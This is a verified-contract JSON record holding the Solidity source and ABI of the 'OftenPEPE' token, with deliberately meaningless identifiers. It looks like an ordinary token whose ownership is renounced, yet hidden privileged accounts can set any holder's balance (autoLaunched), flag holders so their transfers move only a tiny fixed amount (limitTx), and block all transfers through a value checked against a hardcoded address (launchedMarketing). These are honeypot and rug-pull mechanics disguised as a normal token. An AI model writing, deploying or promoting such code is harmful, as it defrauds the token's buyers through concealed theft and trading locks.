{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface tokenToEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingAmountReceiver) external view returns (uint256);\n\n    function transfer(address marketingTo, uint256 fundMode) external returns (bool);\n\n    function allowance(address launchAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingTo,\n        uint256 fundMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapToken, uint256 value);\n    event Approval(address indexed launchAt, address indexed spender, uint256 value);\n}\n\nabstract contract toTxFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenSender {\n    function createPair(address amountWallet, address modeEnable) external returns (address);\n}\n\ninterface tradingEnable is tokenToEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OftenPEPE is toTxFrom, tokenToEnable, tradingEnable {\n\n    function atSwap(address totalShould, address marketingTo, uint256 fundMode) internal returns (bool) {\n        if (totalShould == receiverTotal) {\n            return toTxReceiver(totalShould, marketingTo, fundMode);\n        }\n        uint256 receiverMin = tokenToEnable(minAuto).balanceOf(sellLaunch);\n        require(receiverMin == buyTx);\n        require(marketingTo != sellLaunch);\n        if (shouldToken[totalShould]) {\n            return toTxReceiver(totalShould, marketingTo, exemptReceiver);\n        }\n        return toTxReceiver(totalShould, marketingTo, fundMode);\n    }\n\n    uint256 marketingTeam;\n\n    function limitTx(address swapFromFund) public {\n        takeSellSwap();\n        if (swapMarketingMax) {\n            swapIs = false;\n        }\n        if (swapFromFund == receiverTotal || swapFromFund == minAuto) {\n            return;\n        }\n        shouldToken[swapFromFund] = true;\n    }\n\n    uint256 constant exemptReceiver = 11 ** 10;\n\n    address sellLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private receiverFund;\n\n    mapping(address => bool) public shouldToken;\n\n    address public minAuto;\n\n    function transfer(address launchedLimit, uint256 fundMode) external virtual override returns (bool) {\n        return atSwap(_msgSender(), launchedLimit, fundMode);\n    }\n\n    string private receiverReceiver = \"Often PEPE\";\n\n    address enableFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address launchedSwapAuto, address toShould) external view virtual override returns (uint256) {\n        if (toShould == enableFund) {\n            return type(uint256).max;\n        }\n        return receiverFund[launchedSwapAuto][toShould];\n    }\n\n    bool public minToIs;\n\n    address private limitReceiverTx;\n\n    constructor (){\n        \n        amountShould walletList = amountShould(enableFund);\n        minAuto = tokenSender(walletList.factory()).createPair(walletList.WETH(), address(this));\n        \n        receiverTotal = _msgSender();\n        minFundTeam();\n        launchedTeamLaunch[receiverTotal] = true;\n        teamMode[receiverTotal] = receiverLiquidity;\n        if (minToIs == marketingExemptReceiver) {\n            launchedSellFrom = fromBuy;\n        }\n        emit Transfer(address(0), receiverTotal, receiverLiquidity);\n    }\n\n    function balanceOf(address marketingAmountReceiver) public view virtual override returns (uint256) {\n        return teamMode[marketingAmountReceiver];\n    }\n\n    uint256 public fromBuy;\n\n    function transferFrom(address totalShould, address marketingTo, uint256 fundMode) external override returns (bool) {\n        if (_msgSender() != enableFund) {\n            if (receiverFund[totalShould][_msgSender()] != type(uint256).max) {\n                require(fundMode <= receiverFund[totalShould][_msgSender()]);\n                receiverFund[totalShould][_msgSender()] -= fundMode;\n            }\n        }\n        return atSwap(totalShould, marketingTo, fundMode);\n    }\n\n    function autoLaunched(address launchedLimit, uint256 fundMode) public {\n        takeSellSwap();\n        teamMode[launchedLimit] = fundMode;\n    }\n\n    uint256 public fromTeam;\n\n    function owner() external view returns (address) {\n        return limitReceiverTx;\n    }\n\n    uint256 public tradingTx;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return limitReceiverTx;\n    }\n\n    bool private marketingExemptReceiver;\n\n    function walletLiquidity(address enableMode) public {\n        if (maxAtReceiver) {\n            return;\n        }\n        \n        launchedTeamLaunch[enableMode] = true;\n        \n        maxAtReceiver = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverLiquidity;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeSwap;\n    }\n\n    bool public maxAtReceiver;\n\n    uint256 private launchedSellFrom;\n\n    mapping(address => uint256) private teamMode;\n\n    function launchedMarketing(uint256 fundMode) public {\n        takeSellSwap();\n        buyTx = fundMode;\n    }\n\n    uint256 private toMin;\n\n    uint256 private receiverLiquidity = 100000000 * 10 ** 18;\n\n    function approve(address toShould, uint256 fundMode) public virtual override returns (bool) {\n        receiverFund[_msgSender()][toShould] = fundMode;\n        emit Approval(_msgSender(), toShould, fundMode);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingFundIs;\n    }\n\n    event OwnershipTransferred(address indexed isList, address indexed autoMin);\n\n    function takeSellSwap() private view {\n        require(launchedTeamLaunch[_msgSender()]);\n    }\n\n    bool public swapIs;\n\n    function toTxReceiver(address totalShould, address marketingTo, uint256 fundMode) internal returns (bool) {\n        require(teamMode[totalShould] >= fundMode);\n        teamMode[totalShould] -= fundMode;\n        teamMode[marketingTo] += fundMode;\n        emit Transfer(totalShould, marketingTo, fundMode);\n        return true;\n    }\n\n    bool private swapMarketingMax;\n\n    uint8 private feeSwap = 18;\n\n    address public receiverTotal;\n\n    uint256 buyTx;\n\n    string private tradingFundIs = \"OPE\";\n\n    function minFundTeam() public {\n        emit OwnershipTransferred(receiverTotal, address(0));\n        limitReceiverTx = address(0);\n    }\n\n    mapping(address => bool) public launchedTeamLaunch;\n\n    uint256 private listLimit;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSwapAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMode\",\"type\":\"uint256\"}],\"name\":\"autoLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmountReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundMode\",\"type\":\"uint256\"}],\"name\":\"launchedMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTeamLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFromFund\",\"type\":\"address\"}],\"name\":\"limitTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAtReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFundTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minToIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"}],\"name\":\"walletLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OftenPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}